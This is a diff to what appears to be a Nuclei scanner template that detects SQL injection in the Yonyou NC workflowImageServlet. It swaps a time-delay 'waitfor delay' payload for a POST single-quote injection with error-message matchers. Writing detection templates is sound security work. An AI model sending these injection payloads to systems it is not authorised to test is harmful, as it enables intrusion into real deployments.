@@ -2,7 +2,7 @@ id: yonyou-nc-workflowImageServlet-sqli
 
 info:
   name: Yonyou NC workflowImageServlet - SQL Injection
-  author: Co5mos
+  author: Co5mos,leadlife
   severity: high
   description: Detects SQL Injection vulnerability in Yonyou NC workflowImageServlet.
   reference:
@@ -14,12 +14,21 @@ info:
 http:
   - raw:
       - |
-        @timeout: 10s
-        GET /portal/pt/servlet/workflowImageServlet/doPost?pageId=login&wfpk=1&proInsPk=1'waitfor+delay+'0:0:6'-- HTTP/1.1
+        POST /portal/pt/servlet/workflowImageServlet/doPost?pageId=login HTTP/1.1
         Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
 
+        wfpk=1'&proInsPk=t
+
+    matchers-condition: and
     matchers:
-      - type: dsl
-        dsl:
-          - 'duration>=6'
-        condition: and
+      - type: status
+        status:
+          - 500
+      
+      - type: word
+        part: body
+        words:
+          - "引号内的字符串没有正确结束"
+          - "quoted string not properly terminated"
+        condition: or
